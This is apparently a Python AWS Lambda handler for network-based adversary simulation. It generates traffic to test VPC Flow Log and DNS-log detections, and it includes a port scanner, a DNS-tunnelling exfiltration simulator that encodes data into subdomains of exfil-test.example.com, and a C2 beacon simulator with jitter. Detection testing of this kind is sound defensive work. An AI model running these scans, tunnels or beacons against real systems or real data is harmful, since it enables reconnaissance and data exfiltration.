"""Lambda handler for network-based adversary testing.

This Lambda function can be deployed within a VPC to generate network traffic
that triggers VPC Flow Logs, Route53 Query Logs, and other network-based
security detections.

Deployment:
- Must be deployed in a VPC with appropriate subnet and security group
- Requires NAT Gateway for external DNS queries
- Security group should allow outbound traffic to test targets

Events:
- Can be triggered manually, by EventBridge schedule, or via API Gateway
- Supports various test scenarios via event payload
"""

import json
import os
import random
import socket
import struct
import time
from datetime import UTC, datetime
from typing import Any, TypedDict


class TestConfig(TypedDict, total=False):
    """Type definition for test configuration."""
    type: str
    target_ip: str
    target_port: int
    hostname: str
    query_type: str
    dns_server: str
    timeout: float
    ports: list[int]
    delay_ms: int
    base_domain: str
    chunks: list[str]
    port: int
    count: int
    interval: float
    jitter: float
    payload: bytes


class ScenarioConfig(TypedDict):
    """Type definition for scenario configuration."""
    name: str
    description: str
    tests: list[TestConfig]


# Protocol constants
PROTOCOL_TCP = 6
PROTOCOL_UDP = 17


def get_timestamp() -> str:
    """Get ISO format timestamp."""
    return datetime.now(UTC).isoformat()


def tcp_connect(target_ip: str, target_port: int, timeout: float = 2.0) -> dict[str, Any]:
    """Attempt TCP connection - triggers VPC Flow Log entry."""
    result = {
        "type": "tcp_connect",
        "target_ip": target_ip,
        "target_port": target_port,
        "timestamp": get_timestamp(),
        "success": False,
        "connected": False,
        "error": None,
    }

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)

        try:
            sock.connect((target_ip, target_port))
            result["success"] = True
            result["connected"] = True
        except (TimeoutError, ConnectionRefusedError, OSError) as e:
            # Connection failed but packet was sent (will be logged)
            result["success"] = True
            result["connected"] = False
            result["error"] = str(e)

        sock.close()

    except Exception as e:
        result["error"] = str(e)

    return result


def dns_query(hostname: str, query_type: str = "A", dns_server: str = "8.8.8.8", timeout: float = 2.0) -> dict[str, Any]:
    """Send DNS query - triggers Route53/DNS logs."""
    result = {
        "type": "dns_query",
        "hostname": hostname,
        "query_type": query_type,
        "dns_server": dns_server,
        "timestamp": get_timestamp(),
        "success": False,
        "response_received": False,
        "error": None,
    }

    try:
        # Build DNS query packet
        query_id = random.randint(0, 65535)
        flags = 0x0100  # Standard query, recursion desired

        header = struct.pack("!HHHHHH", query_id, flags, 1, 0, 0, 0)

        # Encode hostname
        qname = b""
        for part in hostname.split("."):
            qname += bytes([len(part)]) + part.encode()
        qname += b"\x00"

        # Query type
        qtypes = {"A": 1, "AAAA": 28, "MX": 15, "TXT": 16, "CNAME": 5}
        qtype = qtypes.get(query_type.upper(), 1)
        question = qname + struct.pack("!HH", qtype, 1)

        packet = header + question

        # Send query
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(packet, (dns_server, 53))
        result["success"] = True

        try:
            response, _ = sock.recvfrom(4096)
            result["response_received"] = True
            result["response_length"] = len(response)
        except TimeoutError:
            pass

        sock.close()

    except Exception as e:
        result["error"] = str(e)

    return result


def udp_send(target_ip: str, target_port: int, payload: bytes = b"\x00") -> dict[str, Any]:
    """Send UDP packet - triggers VPC Flow Log entry."""
    result = {
        "type": "udp_send",
        "target_ip": target_ip,
        "target_port": target_port,
        "timestamp": get_timestamp(),
        "success": False,
        "error": None,
    }

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(payload, (target_ip, target_port))
        result["success"] = True
        sock.close()
    except Exception as e:
        result["error"] = str(e)

    return result


def port_scan(target_ip: str, ports: list[int], delay_ms: int = 100) -> list[dict[str, Any]]:
    """Perform port scan - generates multiple VPC Flow Log entries."""
    results = []
    for port in ports:
        result = tcp_connect(target_ip, port)
        results.append(result)
        if delay_ms > 0:
            time.sleep(delay_ms / 1000)
    return results


def dns_tunnel_sim(base_domain: str, chunks: list[str], dns_server: str = "8.8.8.8") -> list[dict[str, Any]]:
    """Simulate DNS tunneling pattern."""
    import base64

    results = []
    for chunk in chunks:
        # Encode data in subdomain (base32 for DNS safety)
        encoded = base64.b32encode(chunk.encode()).decode().rstrip("=").lower()
        hostname = f"{encoded}.{base_domain}"
        result = dns_query(hostname, "TXT", dns_server)
        results.append(result)
        time.sleep(0.1)

    return results


def beacon_sim(target_ip: str, port: int, count: int = 5, interval: float = 5.0, jitter: float = 0.1) -> list[dict[str, Any]]:
    """Simulate C2 beacon pattern with regular callbacks."""
    results = []
    for i in range(count):
        result = tcp_connect(target_ip, port)
        results.append(result)

        if i < count - 1:
            jitter_amount = random.uniform(-jitter, jitter) * interval
            sleep_time = max(0.1, interval + jitter_amount)
            time.sleep(sleep_time)

    return results


def run_test(test_config: TestConfig) -> dict[str, Any]:
    """Run a single test based on configuration."""
    test_type = test_config.get("type", "tcp_connect")

    if test_type == "tcp_connect":
        return tcp_connect(
            test_config["target_ip"],
            test_config["target_port"],
            test_config.get("timeout", 2.0),
        )

    elif test_type == "dns_query":
        return dns_query(
            test_config["hostname"],
            test_config.get("query_type", "A"),
            test_config.get("dns_server", "8.8.8.8"),
            test_config.get("timeout", 2.0),
        )

    elif test_type == "udp_send":
        return udp_send(
            test_config["target_ip"],
            test_config["target_port"],
            test_config.get("payload", b"\x00"),
        )

    elif test_type == "port_scan":
        return {
            "type": "port_scan",
            "results": port_scan(
                test_config["target_ip"],
                test_config.get("ports", [22, 80, 443, 3389]),
                test_config.get("delay_ms", 100),
            ),
        }

    elif test_type == "dns_tunnel":
        return {
            "type": "dns_tunnel",
            "results": dns_tunnel_sim(
                test_config["base_domain"],
                test_config.get("chunks", ["test", "data"]),
                test_config.get("dns_server", "8.8.8.8"),
            ),
        }

    elif test_type == "beacon":
        return {
            "type": "beacon",
            "results": beacon_sim(
                test_config["target_ip"],
                test_config["port"],
                test_config.get("count", 5),
                test_config.get("interval", 5.0),
                test_config.get("jitter", 0.1),
            ),
        }

    else:
        return {"error": f"Unknown test type: {test_type}"}


# Pre-defined test scenarios
SCENARIOS: dict[str, ScenarioConfig] = {
    "basic_connectivity": {
        "name": "Basic Connectivity Test",
        "description": "Simple TCP and DNS tests to verify logging",
        "tests": [
            {"type": "tcp_connect", "target_ip": "8.8.8.8", "target_port": 53},
            {"type": "dns_query", "hostname": "example.com"},
        ],
    },
    "port_scan_sim": {
        "name": "Port Scan Simulation",
        "description": "Generates VPC Flow logs simulating reconnaissance",
        "tests": [
            {
                "type": "port_scan",
                "target_ip": "127.0.0.1",  # Default to localhost for safety
                "ports": [22, 23, 80, 443, 3389, 8080, 8443],
            },
        ],
    },
    "dns_exfil_sim": {
        "name": "DNS Exfiltration Simulation",
        "description": "Generates DNS queries simulating data exfiltration",
        "tests": [
            {
                "type": "dns_tunnel",
                "base_domain": "exfil-test.example.com",
                "chunks": ["secret", "data", "here", "test"],
            },
        ],
    },
    "c2_beacon_sim": {
        "name": "C2 Beacon Simulation",
        "description": "Generates regular connection pattern like malware beacon",
        "tests": [
            {
                "type": "beacon",
                "target_ip": "127.0.0.1",  # Default to localhost
                "port": 443,
                "count": 5,
                "interval": 2.0,
                "jitter": 0.2,
            },
        ],
    },
    "full_test_suite": {
        "name": "Full Test Suite",
        "description": "Comprehensive test of all network detection triggers",
        "tests": [
            {"type": "tcp_connect", "target_ip": "8.8.8.8", "target_port": 53},
            {"type": "dns_query", "hostname": "test.example.com"},
            {"type": "port_scan", "target_ip": "127.0.0.1", "ports": [80, 443, 8080]},
            {"type": "dns_tunnel", "base_domain": "test.example.com", "chunks": ["test"]},
        ],
    },
}


def handler(event: dict[str, Any], context: Any) -> dict[str, Any]:
    """Lambda handler for network adversary testing.

    Event payload options:

    1. Run pre-defined scenario:
        {"scenario": "port_scan_sim", "target_ip": "10.0.0.50"}

    2. Run custom tests:
        {"tests": [{"type": "tcp_connect", "target_ip": "10.0.0.50", "target_port": 22}]}

    3. Health check:
        {"action": "health_check"}

    4. List available scenarios:
        {"action": "list_scenarios"}
    """
    print(f"Adversary Network Test Lambda invoked at {get_timestamp()}")
    print(f"Event: {json.dumps(event)}")

    # Get configuration from environment
    default_target = os.environ.get("DEFAULT_TARGET_IP", "127.0.0.1")
    dns_server = os.environ.get("DNS_SERVER", "8.8.8.8")

    # Handle special actions
    action = event.get("action")

    if action == "health_check":
        return {
            "statusCode": 200,
            "body": json.dumps({
                "status": "healthy",
                "timestamp": get_timestamp(),
                "default_target": default_target,
                "dns_server": dns_server,
            }),
        }

    if action == "list_scenarios":
        scenarios_info = {
            name: {"name": s["name"], "description": s["description"]}
            for name, s in SCENARIOS.items()
        }
        return {
            "statusCode": 200,
            "body": json.dumps({"scenarios": scenarios_info}),
        }

    # Run tests
    results = []
    start_time = time.time()

    if "scenario" in event:
        # Run pre-defined scenario
        scenario_name = event["scenario"]
        if scenario_name not in SCENARIOS:
            return {
                "statusCode": 400,
                "body": json.dumps({"error": f"Unknown scenario: {scenario_name}"}),
            }

        scenario = SCENARIOS[scenario_name]
        # Deep copy the tests list to allow modification
        tests: list[TestConfig] = [dict(t) for t in scenario["tests"]]  # type: ignore[misc]

        # Allow override of target IP
        if "target_ip" in event:
            for test in tests:
                if "target_ip" in test:
                    test["target_ip"] = event["target_ip"]

        for test in tests:
            result = run_test(test)
            results.append(result)

        scenario_info = {
            "scenario_name": scenario_name,
            "scenario_description": scenario["description"],
        }

    elif "tests" in event:
        # Run custom tests
        custom_tests: list[TestConfig] = event["tests"]
        for test_config in custom_tests:
            result = run_test(test_config)
            results.append(result)

        scenario_info = {"custom_tests": True}

    else:
        # Default: run basic connectivity test
        results.append(tcp_connect("8.8.8.8", 53))
        results.append(dns_query("example.com"))
        scenario_info = {"default_test": True}

    execution_time = time.time() - start_time

    # Count successes
    successful = sum(
        1 for r in results
        if r.get("success") or (r.get("results") and all(x.get("success") for x in r["results"]))
    )

    response = {
        "statusCode": 200,
        "body": json.dumps({
            **scenario_info,
            "timestamp": get_timestamp(),
            "execution_time_seconds": round(execution_time, 2),
            "tests_run": len(results),
            "successful": successful,
            "results": results,
        }),
    }

    print(f"Test complete: {len(results)} tests, {successful} successful")
    return response


# For local testing
if __name__ == "__main__":
    # Test basic connectivity
    print("Testing basic connectivity...")
    result = handler({"scenario": "basic_connectivity"}, None)
    print(json.dumps(json.loads(result["body"]), indent=2))
